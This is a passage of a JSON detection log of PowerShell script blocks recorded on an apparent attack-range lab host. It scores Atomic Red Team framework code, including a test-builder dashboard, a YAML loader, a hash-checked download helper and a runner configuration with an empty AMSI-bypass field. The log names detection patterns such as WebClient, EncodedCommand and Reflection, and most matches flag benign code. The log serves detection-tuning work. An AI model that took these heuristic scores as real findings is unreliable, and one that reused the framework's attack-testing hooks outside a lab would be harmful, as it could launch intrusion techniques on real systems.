-OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDElement -Id \"yaml\" -Content {\n                        $yaml -replace \"^\", \"  \" -replace \"`n\", \"`n  \"\n                    }\n                }\n            )\n            # Copy Yaml to clipboard\n            New-UDButton -Text \"Copy\" -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDClipboard -Data $yaml\n                    Show-UDToast -Message \"Copied YAML to the Clipboard\" -BackgroundColor YellowGreen\n                }\n            )\n        }\n    }\n\n    $epFillTestData = New-UDEndpoint -Endpoint {\n        Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard }\n        Add-UDElement -ParentId \"depCard\"   -Content { New-depCard }\n        Start-Sleep 1\n        Set-UDElement -Id atomicName -Attributes @{value = \"My new atomic\" }\n        Set-UDElement -Id atomicDescription -Attributes @{value = \"This is the atomic description\" }\n        Set-UDElement -Id attackCommands -Attributes @{value = \"echo this`necho that\" }\n        Set-UDElement -Id cleanupCommands -Attributes @{value = \"cleanup commands here`nand here...\" }\n        # InputArgs\n        $cardNumber = 1\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgName\" -Attributes @{value = \"input_arg_1\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDescription\" -Attributes @{value = \"InputArg1 description\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDefault\" -Attributes @{value = \"this is the default value\" }\n        # dependencies\n        Set-UDElement -Id \"depCard$cardNumber-depDescription\" -Attributes @{value = \"This file must exist\" }\n        Set-UDElement -Id \"depCard$cardNumber-prereqCommand\" -Attributes @{value = \"if (this) then that\" }\n        Set-UDElement -Id \"depCard$cardNumber-getPrereqCommand\" -Attributes @{value = \"iwr\" }\n\n    }\n    ############## End EndPoint (ep) Definitions\n\n    ############## Static Definitions\n    $supportedPlatforms = New-UDLayout -Columns 4 {\n        New-UDElement -Tag Label -Attributes @{ style = @{\"font-size\" = \"15px\" } } -Content { \"Supported Platforms:\" }\n        New-UDCheckbox -FilledIn -Label \"Windows\" -Checked -Id spWindows\n        New-UDCheckbox -FilledIn -Label \"Linux\" -Id spLinux\n        New-UDCheckbox -FilledIn -Label \"macOS\"-Id spMacOS\n    }\n\n    $executorRow = New-UDLayout -Columns 4 {\n        New-UDSelectX 'executorSelector' \"Executor for Attack Commands\"\n        New-UDCheckbox -ID elevationRequired -FilledIn -Label \"Requires Elevation to Execute Successfully?\"\n    }\n\n    $genarateYamlButton = New-UDRow -Columns {\n        New-UDColumn -Size 8 -Content { }\n        New-UDColumn -Size 4 -Content {\n            New-UDButton -Text \"Generate Test Definition YAML\" -OnClick ( $epYamlModal )\n        }\n    }\n\n    ############## End Static Definitions\n\n    ############## The Dashboard\n    $idleTimeOut = New-TimeSpan -Minutes 10080\n    $db = New-UDDashboard -Title \"Atomic Test Creation\" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {\n        New-UDCard -Id \"mainCard\" -Content {\n            New-UDCard -Content {\n                New-UDTextBoxX 'atomicName' \"Atomic Test Name\"\n                New-UDTextAreaX \"atomicDescription\" \"Atomic Test Description\"\n                $supportedPlatforms\n                New-UDTextAreaX \"attackCommands\" \"Attack Commands\"\n                $executorRow\n                New-UDTextAreaX \"cleanupCommands\" \"Cleanup Commands (Optional)\"\n                $genarateYamlButton\n            }\n\n            # input args\n            New-UDCard -Id \"inputCard\" -Endpoint {\n                New-UDButton -Text \"Add Input Argument (Optional)\" -OnClick (\n                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard } }\n                )\n            }\n\n            # prereqs\n            New-UDCard -Id \"depCard\" -Endpoint {\n                New-UDLayout -columns 4 {\n                    New-UDButton -Text \"Add Prerequisite (Optional)\" -OnClick (\n                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"depCard\" -Content { New-depCard } }\n                    )\n                    New-UDSelectX 'preReqEx' \"Executor for Prereq Commands\"\n                }\n            }\n        }\n\n        # button to fill form with test data for development purposes\n        if ($false) { New-UDButton -Text \"Fill Test Data\" -OnClick ( $epFillTestData ) }\n    }\n    ############## End of the Dashboard\n\n    Stop-AtomicGUI\n    Start-UDDashboard -port $port -Dashboard $db -Name \"AtomicGUI\" -ListenAddress 127.0.0.1\n    start-process http://localhost:$port\n}\n\nfunction Stop-AtomicGUI {\n    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard\n    Write-Host \"Stopped all AtomicGUI Dashboards\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'start-process'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2503572+00:00",
      "event_id": 35710715,
      "risk_score": 7,
      "detected_patterns": ", WebClient, Get, SuspiciousKeyword",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]",
      "command_length": 13819,
      "full_command": "function Start-AtomicGUI {\n    param (\n        [Int] $port = 8487\n    )\n    # Install-Module UniversalDashboard if not already installed\n    $UDcommunityInstalled = Get-InstalledModule -Name \"UniversalDashboard.Community\" -ErrorAction:SilentlyContinue\n    $UDinstalled = Get-InstalledModule -Name \"UniversalDashboard\" -ErrorAction:SilentlyContinue\n    if (-not $UDcommunityInstalled -and -not $UDinstalled) {\n        Write-Host \"Installing UniversalDashboard.Community\"\n        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force\n    }\n\n    ############## Function Definitions Made Available to EndPoints\n    function New-UDTextAreaX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"textarea\" -id  $ID -Attributes @{ class = \"materialize-textarea ud-input\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    function New-UDTextBoxX ($ID, $PlaceHolder) {\n        New-UDElement -Tag div -Attributes @{class = \"input-field col\" } -Content {\n            New-UDElement -Tag \"input\" -id $ID -Attributes @{ class = \"ud-input\"; type = \"text\" }\n            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }\n        }\n    }\n\n    $InputArgCards = @{ }\n    function New-InputArgCard {\n        $cardNumber = $InputArgCards.count + 1\n        $newCard = New-UDCard -ID \"InputArgCard$cardNumber\" -Content {\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgName\" \"Input Argument Name\"\n            New-UDTextAreaX \"InputArgCard$cardNumber-InputArgDescription\" \"Description\"\n            New-UDTextBoxX \"InputArgCard$cardNumber-InputArgDefault\" \"Default Value\"\n            New-UDLayout -columns 4 {\n                New-UDSelect -ID \"InputArgCard$cardNumber-InputArgType\" -Label \"Type\" -Option {\n                    New-UDSelectOption -Name \"Path\" -Value \"path\"\n                    New-UDSelectOption -Name \"String\" -Value \"string\"\n                    New-UDSelectOption -Name \"Url\" -Value \"url\"\n                    New-UDSelectOption -Name \"Integer\" -Value \"integer\"\n                }\n            }\n            New-UDButton -Text \"Remove this Input Argument\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"InputArgCard$cardNumber\"\n                    $inputArgCards[\"InputArgCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $inputArgCards)\n            )\n        }\n        $InputArgCards.Add(\"InputArgCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    $depCards = @{ }\n    function New-depCard {\n        $cardNumber = $depCards.count + 1\n        $newCard = New-UDCard -ID \"depCard$cardNumber\" -Content {\n            New-UDTextBoxX \"depCard$cardNumber-depDescription\" \"Prereq Description\"\n            New-UDTextAreaX \"depCard$cardNumber-prereqCommand\" \"Check prereqs Command\"\n            New-UDTextAreaX \"depCard$cardNumber-getPrereqCommand\" \"Get Prereqs Command\"\n            New-UDButton -Text \"Remove this Prereq\"  -OnClick (\n                New-UDEndpoint -Endpoint {\n                    Remove-UDElement -Id \"depCard$cardNumber\"\n                    $depCards[\"depCard$cardNumber\"] = $true\n                } -ArgumentList @($cardNumber, $depCards)\n            )\n        }\n        $depCards.Add(\"depCard$cardNumber\", $false) | Out-Null\n        $newCard\n    }\n\n    function New-UDSelectX ($Id, $Label) {\n        New-UDSelect -Label $Label -Id $Id -Option {\n            New-UDSelectOption -Name \"PowerShell\" -Value \"PowerShell\" -Selected\n            New-UDSelectOption -Name \"Command Prompt\" -Value \"CommandPrompt\"\n            New-UDSelectOption -Name \"Bash\" -Value \"Bash\"\n            New-UDSelectOption -Name \"Sh\" -Value \"Sh\"\n        }\n    }\n\n    ############## End Function Definitions Made Available to EndPoints\n\n    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint\n    $ei = New-UDEndpointInitialization `\n        -Function @(\"New-InputArgCard\", \"New-depCard\", \"New-UDTextAreaX\", \"New-UDTextBoxX\", \"New-UDSelectX\") `\n        -Variable @(\"InputArgCards\", \"depCards\", \"yaml\") `\n        -Module @(\"..\\Invoke-AtomicRedTeam.psd1\")\n\n    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions\n    $BuildAndDisplayYamlScriptBlock = {\n        $testName = (Get-UDElement -Id atomicName).Attributes['value']\n        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']\n        $platforms = @()\n        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += \"Windows\" }\n        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += \"Linux\" }\n        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += \"macOS\" }\n        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']\n        $executor = (Get-UDElement -Id executorSelector).Attributes['value']\n        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']\n        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']\n        if (\"\" -eq $executor) { $executor = \"PowerShell\" }\n        # input args\n        $inputArgs = @()\n        $InputArgCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # this was not deleted\n                $prefix = $_.key\n                $InputArgName = (Get-UDElement -Id \"$prefix-InputArgName\").Attributes['value']\n                $InputArgDescription = (Get-UDElement -Id \"$prefix-InputArgDescription\").Attributes['value']\n                $InputArgDefault = (Get-UDElement -Id \"$prefix-InputArgDefault\").Attributes['value']\n                $InputArgType = (Get-UDElement -Id \"$prefix-InputArgType\").Attributes['value']\n                if (\"\" -eq $InputArgType) { $InputArgType = \"String\" }\n                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings\n                $inputArgs += $NewInputArg\n            }\n        }\n        # dependencies\n        $dependencies = @()\n        $preReqEx = \"\"\n        $depCards.GetEnumerator() | ForEach-Object {\n            if ($_.Value -eq $false) {\n                # a value of true means the card was deleted, so only add dependencies from non-deleted cards\n                $prefix = $_.key\n                $depDescription = (Get-UDElement -Id \"$prefix-depDescription\").Attributes['value']\n                $prereqCommand = (Get-UDElement -Id \"$prefix-prereqCommand\").Attributes['value']\n                $getPrereqCommand = (Get-UDElement -Id \"$prefix-getPrereqCommand\").Attributes['value']\n                $preReqEx = (Get-UDElement -Id \"preReqEx\").Attributes['value']\n                if (\"\" -eq $preReqEx) { $preReqEx = \"PowerShell\" }\n                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings\n                $dependencies += $NewDep\n            }\n        }\n        $depParams = @{ }\n        if ($dependencies.count -gt 0) {\n            $depParams.add(\"DependencyExecutorType\", $preReqEx)\n            $depParams.add(\"Dependencies\", $dependencies)\n        }\n        if (($cleanupCommands -ne \"\") -and ($null -ne $cleanupCommands)) { $depParams.add(\"ExecutorCleanupCommand\", $cleanupCommands) }\n        $depParams.add(\"ExecutorElevationRequired\", $elevationRequired)\n\n        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams\n        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace \"^\", \"- \" -replace \"`n\", \"`n  \"\n        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }\n        New-UDElement -ID yaml -Tag pre -Content { $yaml }\n    }\n\n    $epYamlModal = New-UDEndpoint -Endpoint {\n        Show-UDModal -Header { New-UDHeading -Size 3 -Text \"Test Definition YAML\" } -Content {\n            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock\n            # Left arrow button (decrease indentation)\n            New-UDButton -Icon arrow_circle_left -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    if (-not $yaml.startsWith(\"- \")) {\n                        Set-UDElement -Id \"yaml\" -Content {\n                            $yaml -replace \"^  \", \"\" -replace \"`n  \", \"`n\"\n                        }\n                    }\n                }\n            )\n            # Right arrow button (increase indentation)\n            New-UDButton -Icon arrow_circle_right -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDElement -Id \"yaml\" -Content {\n                        $yaml -replace \"^\", \"  \" -replace \"`n\", \"`n  \"\n                    }\n                }\n            )\n            # Copy Yaml to clipboard\n            New-UDButton -Text \"Copy\" -OnClick (\n                New-UDEndpoint -Endpoint {\n                    $yaml = (Get-UDElement -Id \"yaml\").Content[0]\n                    Set-UDClipboard -Data $yaml\n                    Show-UDToast -Message \"Copied YAML to the Clipboard\" -BackgroundColor YellowGreen\n                }\n            )\n        }\n    }\n\n    $epFillTestData = New-UDEndpoint -Endpoint {\n        Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard }\n        Add-UDElement -ParentId \"depCard\"   -Content { New-depCard }\n        Start-Sleep 1\n        Set-UDElement -Id atomicName -Attributes @{value = \"My new atomic\" }\n        Set-UDElement -Id atomicDescription -Attributes @{value = \"This is the atomic description\" }\n        Set-UDElement -Id attackCommands -Attributes @{value = \"echo this`necho that\" }\n        Set-UDElement -Id cleanupCommands -Attributes @{value = \"cleanup commands here`nand here...\" }\n        # InputArgs\n        $cardNumber = 1\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgName\" -Attributes @{value = \"input_arg_1\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDescription\" -Attributes @{value = \"InputArg1 description\" }\n        Set-UDElement -Id \"InputArgCard$cardNumber-InputArgDefault\" -Attributes @{value = \"this is the default value\" }\n        # dependencies\n        Set-UDElement -Id \"depCard$cardNumber-depDescription\" -Attributes @{value = \"This file must exist\" }\n        Set-UDElement -Id \"depCard$cardNumber-prereqCommand\" -Attributes @{value = \"if (this) then that\" }\n        Set-UDElement -Id \"depCard$cardNumber-getPrereqCommand\" -Attributes @{value = \"iwr\" }\n\n    }\n    ############## End EndPoint (ep) Definitions\n\n    ############## Static Definitions\n    $supportedPlatforms = New-UDLayout -Columns 4 {\n        New-UDElement -Tag Label -Attributes @{ style = @{\"font-size\" = \"15px\" } } -Content { \"Supported Platforms:\" }\n        New-UDCheckbox -FilledIn -Label \"Windows\" -Checked -Id spWindows\n        New-UDCheckbox -FilledIn -Label \"Linux\" -Id spLinux\n        New-UDCheckbox -FilledIn -Label \"macOS\"-Id spMacOS\n    }\n\n    $executorRow = New-UDLayout -Columns 4 {\n        New-UDSelectX 'executorSelector' \"Executor for Attack Commands\"\n        New-UDCheckbox -ID elevationRequired -FilledIn -Label \"Requires Elevation to Execute Successfully?\"\n    }\n\n    $genarateYamlButton = New-UDRow -Columns {\n        New-UDColumn -Size 8 -Content { }\n        New-UDColumn -Size 4 -Content {\n            New-UDButton -Text \"Generate Test Definition YAML\" -OnClick ( $epYamlModal )\n        }\n    }\n\n    ############## End Static Definitions\n\n    ############## The Dashboard\n    $idleTimeOut = New-TimeSpan -Minutes 10080\n    $db = New-UDDashboard -Title \"Atomic Test Creation\" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {\n        New-UDCard -Id \"mainCard\" -Content {\n            New-UDCard -Content {\n                New-UDTextBoxX 'atomicName' \"Atomic Test Name\"\n                New-UDTextAreaX \"atomicDescription\" \"Atomic Test Description\"\n                $supportedPlatforms\n                New-UDTextAreaX \"attackCommands\" \"Attack Commands\"\n                $executorRow\n                New-UDTextAreaX \"cleanupCommands\" \"Cleanup Commands (Optional)\"\n                $genarateYamlButton\n            }\n\n            # input args\n            New-UDCard -Id \"inputCard\" -Endpoint {\n                New-UDButton -Text \"Add Input Argument (Optional)\" -OnClick (\n                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"inputCard\" -Content { New-InputArgCard } }\n                )\n            }\n\n            # prereqs\n            New-UDCard -Id \"depCard\" -Endpoint {\n                New-UDLayout -columns 4 {\n                    New-UDButton -Text \"Add Prerequisite (Optional)\" -OnClick (\n                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId \"depCard\" -Content { New-depCard } }\n                    )\n                    New-UDSelectX 'preReqEx' \"Executor for Prereq Commands\"\n                }\n            }\n        }\n\n        # button to fill form with test data for development purposes\n        if ($false) { New-UDButton -Text \"Fill Test Data\" -OnClick ( $epFillTestData ) }\n    }\n    ############## End of the Dashboard\n\n    Stop-AtomicGUI\n    Start-UDDashboard -port $port -Dashboard $db -Name \"AtomicGUI\" -ListenAddress 127.0.0.1\n    start-process http://localhost:$port\n}\n\nfunction Stop-AtomicGUI {\n    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard\n    Write-Host \"Stopped all AtomicGUI Dashboards\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'start-process'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.6524531+00:00",
      "event_id": 35710822,
      "risk_score": 7,
      "detected_patterns": ", WebClient, SuspiciousKeyword, Reflection",
      "pattern_details": "WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]",
      "command_length": 2194,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path\n\nfunction Load-Assembly {\n    $libDir = Join-Path $here \"lib\"\n    $assemblies = @{\n        \"core\" = Join-Path $libDir \"netstandard2.1\\YamlDotNet.dll\";\n        \"net45\" = Join-Path $libDir \"net45\\YamlDotNet.dll\";\n        \"net35\" = Join-Path $libDir \"net35\\YamlDotNet.dll\";\n    }\n\n    if ($PSVersionTable.Keys -contains \"PSEdition\") {\n        if ($PSVersionTable.PSEdition -eq \"Core\") {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"core\"])\n        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net45\"])\n        } else {\n            return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n        }\n    } else { # Powershell 4.0 and lower do not know \"PSEdition\" yet\n        return [Reflection.Assembly]::LoadFrom($assemblies[\"net35\"])\n    }\n}\n\n\nfunction Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}\n\nInitialize-Assemblies | Out-Null\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'\nPattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2389869+00:00",
      "event_id": 35710709,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 1039,
      "full_command": "function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {\n    $success = $false\n    $null = @(\n        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null\n        $ms = New-Object IO.MemoryStream\n        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)\n        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)\n        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n        $actualHash = (Get-FileHash -InputStream $ms).Hash\n        if ( $hash -eq $actualHash) {\n            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null\n            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)\n            $ms.CopyTo($fileStream);\n            $fileStream.Close()\n            $success = $true\n        }\n        else {\n            Write-Host -ForegroundColor red \"File hash mismatch, expected: $hash, actual: $actualHash\"\n        }\n    )\n    $success\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1950925+00:00",
      "event_id": 35710682,
      "risk_score": 6,
      "detected_patterns": ", EncodedCommand, SuspiciousCmdlet, Get",
      "pattern_details": "EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 431,
      "full_command": "function Get-PreferredIPAddress($isWindows) {\n    if ($isWindows) {\n        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne \"WellKnown\" }).IPAddress\n    }\n    elseif ($IsMacOS) {\n        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr\n    }\n    elseif ($IsLinux) {\n        return ip -4 -br addr show | sed -n -e 's/^.*UP\\s* //p' | cut -d \"/\" -f 1\n    }\n    else {\n        return ''\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e ''\nPattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.0786021+00:00",
      "event_id": 35710657,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 5396,
      "full_command": "\n$artConfig = [PSCustomObject]@{\n\n  # [optional] These two configs are calculated programatically, you probably don't need to change them\n  basehostname               = $((hostname | Select-String -Pattern \"(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$\").Matches.Groups[1].value)\n  OS                         = $( if ($IsLinux) { \"linux\" } elseif ($IsMacOS) { \"macos\" } else { \"windows\" })\n\n  # [optional(if using default install paths)] Paths to your Atomic Red Team \"atomics\" folder and your \"invoke-atomicredteam\" folder\n  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"/AtomicRedTeam/invoke-atomicredteam\" # this is the default install path so you probably don't need to change this\n  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"AtomicRedTeam/atomics\" # this is the default install path so you probably don't need to change this\n  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })   \"PrivateAtomics/atomics\" # if you aren't providing your own private atomics that are custom written by you, just leave this as is\n\n  # [ Optional ] The user that will be running each atomic test\n  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { \"$env:USERDOMAIN\\$env:USERNAME\" }) # example \"corp\\atomicrunner\"\n\n  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory\n  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example \"C:\\Users\\atomicrunner\"\n\n  # [optional]\n  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete\n  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner\n  scheduleFileName           = \"AtomicRunnerSchedule.csv\"\n\n  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger\n  LoggingModule              = ''\n\n  # [optional] Syslog configuration, default execution logs will be sent to this server:port\n  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\\\)\n  syslogPort                 = 514\n  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS\n\n  verbose                    = $true; # set to true for more log output\n\n  # [optional] logfile filename configs\n  logFolder                  = \"AtomicRunner-Logs\"\n  timeLocal                  = (Get-Date(get-date) -uformat \"%Y-%m-%d\").ToString()\n  logFileName                = \"$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv\"\n\n  # amsi bypass script block (applies to Windows only)\n  absb                       = $null\n\n  # AtomicRunnerService install directory\n  ServiceInstallDir                 = \"${ENV:windir}\\System32\"\n\n}\n\n# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values\n$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent\n$pathToPrivateConfig = Join-Path $root \"privateConfig.ps1\"\nif (Test-Path ($pathToPrivateConfig)) {\n  if ($IsLinux -or $IsMacOS) {\n    chmod +x $pathToPrivateConfig\n  }\n  & ($pathToPrivateConfig)\n}\n\n#####################################################################################\n# All of the configs below are calculated using the script block in the \"Value\" field.\n# This way, when you change the 'basePath' everything else is updated.\n# You should probably leave all of the stuff below alone.\n#####################################################################################\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"runnerFolder\"\n  Value       = { Join-Path $artConfig.basePath \"AtomicRunner\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"atomicLogsPath\"\n  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"scheduleFile\"\n  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"credFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"psc_$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"execLogPath\"\n  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"stopFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"stop.txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"logFile\"\n  Value       = { Join-Path $artConfig.atomicLogsPath \"log-$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.8447911+00:00",
      "event_id": 35710642,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 16921,
